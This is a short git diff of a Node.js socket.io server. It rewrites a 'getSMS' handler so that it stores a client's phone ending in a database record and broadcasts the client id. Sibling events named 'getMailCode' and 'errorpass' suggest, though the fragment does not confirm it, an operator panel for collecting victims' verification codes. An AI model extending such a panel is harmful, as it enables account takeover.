@@ -28,9 +28,20 @@ module.exports = {
             io.emit('getMailCode', id)
         })
 
-        socket.on('getSMS', async (id) => {
-            clientList[socket.id] = id
-            io.emit('getSMS', id)
+        socket.on('getSMS', async (data) => {
+            try {
+                clientList[socket.id] = data.idClient
+
+                const client = await Client.findByPk(data.idClient)
+
+                if (!client) return
+
+                await client.update({ phoneEnd: data.phoneEnd })
+
+                io.emit('getSMS', data.idClient)
+            } catch (error) {
+                console.log(error)
+            }
         })
 
         socket.on('errorpass', (id) => {
